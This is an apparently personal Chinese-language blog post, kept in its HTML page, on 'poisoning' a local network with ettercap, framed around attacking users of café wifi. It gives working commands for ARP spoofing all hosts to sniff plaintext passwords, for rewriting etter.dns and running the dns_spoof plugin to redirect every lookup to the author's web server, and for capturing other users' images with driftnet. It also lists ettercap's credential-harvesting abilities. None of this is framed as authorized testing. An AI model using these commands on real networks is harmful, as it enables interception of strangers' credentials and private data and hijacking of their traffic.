@@ -1,0 +1,332 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>ettercap毒化内网的一些姿势 - Exploit The Day</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="2st" /><meta name="description" content="NULL" /><meta name="keywords" content="Mac, Github, Vue, React, Front End" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.72.0 with theme even" />
+
+
+<link rel="canonical" href="https://m-ouse.github.io/post-%E5%89%AF%E6%9C%AC/ettercap%E6%AF%92%E5%8C%96%E5%86%85%E7%BD%91/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+<link href="/sass/main.min.8c3cbcb0324c2bb4875ceccba4007cbad4b4ac8377f33af9953c3e7684534a50.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/reset-even.css">
+
+
+<meta property="og:title" content="ettercap毒化内网的一些姿势" />
+<meta property="og:description" content="NULL" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://m-ouse.github.io/post-%E5%89%AF%E6%9C%AC/ettercap%E6%AF%92%E5%8C%96%E5%86%85%E7%BD%91/" />
+<meta property="article:published_time" content="2019-12-19T00:00:00+00:00" />
+<meta property="article:modified_time" content="2019-12-19T00:00:00+00:00" />
+<meta itemprop="name" content="ettercap毒化内网的一些姿势">
+<meta itemprop="description" content="NULL">
+<meta itemprop="datePublished" content="2019-12-19T00:00:00&#43;00:00" />
+<meta itemprop="dateModified" content="2019-12-19T00:00:00&#43;00:00" />
+<meta itemprop="wordCount" content="1574">
+
+
+
+<meta itemprop="keywords" content="penetrate," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="ettercap毒化内网的一些姿势"/>
+<meta name="twitter:description" content="NULL"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">Exploit The Day</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/categories/">
+        <li class="mobile-menu-item">Categories</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about/">
+        <li class="mobile-menu-item">About</li>
+      </a><a href="/friends/">
+        <li class="mobile-menu-item">Friends</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">Exploit The Day</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/categories/">Categories</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about/">About</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/friends/">Friends</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+  <div class="post-content">
+    <p>ettercap毒化内网的几个姿势</p>
+<p>title: 
+tag: 渗透
+categories: 安全</p>
+<h3 id="0xffffffff当咖啡厅有wifi时手里的咖啡就不香了">0xffffffff.当咖啡厅有wifi时，手里的咖啡就不香了</h3>
+<h3 id="0x0写在前面的一些注意事项">0x0.写在前面的一些注意事项</h3>
+<p>因为ettercap并不会进行网络转发，我们需要提前打开</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"> sysctl -w net.ipv4.ip_forward <span class="o">=</span> <span class="m">1</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>当前系统就能实现包转发，但下次启动计算机时将失效，因为一般使用情景都是live启动，所以这一点不用特殊关注，如果像保存相关设置， 在配置文件/etc/sysctl.conf中写入：net.ipv4.ip_forward = 1.这样就不会在重启的时候失效 。 用户还可以使用如下命令查看当前系统是否支持包转发：sysctl net.ipv4.ip_forward</p>
+<p>此外，ettercap 确实已经非常老了,也确实是那个时代的经典，且有几年没有大的更新了，但对于一些防护并不是特别好的内网,依然非常实用。</p>
+<h3 id="0x1抓取用户连接网站的明文密码">0x1.抓取用户连接网站的明文密码</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo ettercap -i eth0 -Tq -M arp:remote /// ///
+</code></pre></td></tr></table>
+</div>
+</div><p><del>仅限于裸的连接，</del></p>
+<h3 id="0x2劫持dns给同一网段下的用户推送你的网页">0x2.劫持DNS，给同一网段下的用户推送你的网页</h3>
+<h5 id="0x1修改ettercap的dns配置文件">0x1修改ettercap的DNS配置文件</h5>
+<p>文件路径在 /etc/ettercap/etter.dns</p>
+<p>在文件中加入，注意下文的ip地址是我们主机的ip</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">*  A 192.168.0.122
+*  PTR 192.168.0.122
+</code></pre></td></tr></table>
+</div>
+</div><p>作用是将所有解析都连到我们的主机上</p>
+<h5 id="0x2搭建web服务">0x2搭建web服务</h5>
+<p>然后我选择开启apache服务</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo service apache2 start
+</code></pre></td></tr></table>
+</div>
+</div><p>web服务的默认目录为 /var/www/html/</p>
+<p>接着启用ettercap中的dns_spoof插件进行欺骗，完成DNS劫持</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">ettercap -T -i wlan0 -q -P dns_spoof /// ///
+</code></pre></td></tr></table>
+</div>
+</div><h3 id="0x3截取用户的照片">0x3.截取用户的照片</h3>
+<p>ettercap+driftnet == everything</p>
+<p>先对内网进行嗅探，设置在wlan上嗅探，可根据实际情况修改</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo ettercap -i wlan0 -Tq -M arp:remote /// ///
+</code></pre></td></tr></table>
+</div>
+</div><p>接着上driftnet</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">sudo driftnet -i wlan0
+</code></pre></td></tr></table>
+</div>
+</div><p>解释一下driftnet的几个参数，根据实际情况使用</p>
+<blockquote>
+<p>-b               捕获到新的图片时发出嘟嘟声</p>
+<p>-i  interface     选择监听接口</p>
+<p>-f  file   读取一个指定pcap数据包中的图片</p>
+<p>-p  不让所监听的接口使用混杂模式</p>
+<p>-a  后台模式：将捕获的图片保存到目录中（不会显示在屏幕上）</p>
+<p>-m number 指定保存图片数的数目</p>
+<p>-d directory  指定保存图片的路径</p>
+<p>-x prefix  指定保存图片的前缀名</p>
+</blockquote>
+<p>顺便举几个栗子：</p>
+<blockquote>
+<p>1.实时监听： driftnet -i wlan0</p>
+<p>2.读取一个指定pcap数据包中的图片： driftnet -f /root/Desktop/cap.pcapng -a -d /root/drifnet/</p>
+</blockquote>
+<h3 id="0x4ettercap的常用功能">0x4.ettercap的常用功能</h3>
+<p><a href="https://www.cnblogs.com/blacksunny/p/5246563.html">参考</a></p>
+<blockquote>
+<ol>
+<li>在已有的连接上注入数据： 可以在维持原有连接不变的基础上想服务器或客户端注入数据，以达到模拟命令或响应的目的。</li>
+<li>SSH1支持：可以捕获SSH1连接上的User和Pass信息，甚至其他数据。（全双工）</li>
+<li>HTTPS支持：可以监听http SSL连接上加密数据，甚至通过Proxy的连接。</li>
+<li>监听通过GRE通道的远程通信：可以通过监听来自远程cisco路由器的GRE通道的数据流，并对它进行中间人攻击。</li>
+<li>Plug-in支持：通过Ettercap的API可以创建自己的Plug-in。</li>
+<li>口令收集：可以收集以下协议的口令信息：TELNET、FTP、POP、RLOGIN、SSH1、ICQ、SMB、MySQL、HTTP、NNTP、X11、NAPSTER、IRC、RIP、BGP、SOCK5、IMAP4、VNC、LDAP、NFS、SNMP、HALFLIFE、QUAKE3、MSNYMSG（不久还会有新的协议获得支持）.</li>
+<li>数据包过滤和丢弃：可以建立一个查找特定字符串（甚至包括十六进制数）的过滤链，根据这个过滤链对TCP/UDP数据包进行过滤并用自己的数据替换这些数据包，或丢弃整个数据包。</li>
+<li>被动的OS指纹提取：可以被动地（不必主动发送数据包）获取局域网上计算机系统的详细信息，包括操作系统版本、运行的服务、打开的端口、IP地址、MAC地址和网卡的生产厂家等信息。</li>
+<li>OS指纹：可以提取被控主机的OS指纹以及它的网卡信息（利用NMAP Fyodor数据库）.</li>
+<li>杀死一个连接：杀死当前连接表中的连接，甚至所有连接。</li>
+<li>数据包生产：可以创建和发送伪造的数据包，允许你伪造从以太报头到应用层的所有信息。</li>
+<li>把捕获的数据流绑定到一个本地端口：可以通过一个客户端软件连接到该端口上，进行进一步地协议解码或向其中注入数据（仅适用于基于ARP的方式）。</li>
+</ol>
+</blockquote>
+  </div>
+</article>
+        </div>
+        
+
+  
+
+  
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="social-links">
+      <a href="mailto:jupmouse@gmail.com" class="iconfont icon-email" title="email"></a>
+      <a href="https://github.com/M-ouse" class="iconfont icon-github" title="github"></a>
+  <a href="https://m-ouse.github.io/index.xml" type="application/rss+xml" class="iconfont icon-rss" title="rss"></a>
+</div>
+
+<div class="copyright">
+  <span class="power-by">
+    由 <a class="hexo-link" href="https://gohugo.io">Hugo</a> 强力驱动
+  </span>
+  <span class="division">|</span>
+  <span class="theme-info">
+    主题 - 
+    <a class="theme-link" href="https://github.com/olOwOlo/hugo-theme-even">Even</a>
+  </span>
+
+  <div class="busuanzi-footer">
+    <span id="busuanzi_container_site_pv"> 本站总访问量 <span id="busuanzi_value_site_pv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 次 </span>
+      <span class="division">|</span>
+    <span id="busuanzi_container_site_uv"> 本站总访客数 <span id="busuanzi_value_site_uv"><img src="/img/spinner.svg" alt="spinner.svg"/></span> 人 </span>
+  </div>
+
+  <span class="copyright-year">
+    &copy; 
+    2019 - 
+    2021
+    <span class="heart">
+      <i class="iconfont icon-heart"></i>
+    </span>
+    <span class="author">2st</span>
+  </span>
+</div>
+    </footer>
+
+    <div class="back-to-top" id="back-to-top">
+      <i class="iconfont icon-up"></i>
+    </div>
+  </div>
+  
+  <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
+  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+
+
+
+<script type="text/javascript" src="/js/main.min.d7b7ada643c9c1a983026e177f141f7363b4640d619caf01d8831a6718cd44ea.js"></script>
+  <script type="text/javascript">
+    window.MathJax = {
+      tex2jax: {inlineMath: [['$','$'], ['\\(','\\)']]},
+      showProcessingMessages: false,
+      messageStyle: 'none'
+    };
+  </script>
+  <script async src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/MathJax.js?config=TeX-MML-AM_CHTML"  integrity="sha256-nvJJv9wWKEm88qvoQl9ekL2J+k/RWIsaSScxxlsrv8k=" crossorigin="anonymous"></script>
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-138883536-1', 'auto');
+	ga('set', 'anonymizeIp', true);
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+
+
+
+
+
+
+</body>
+</html>
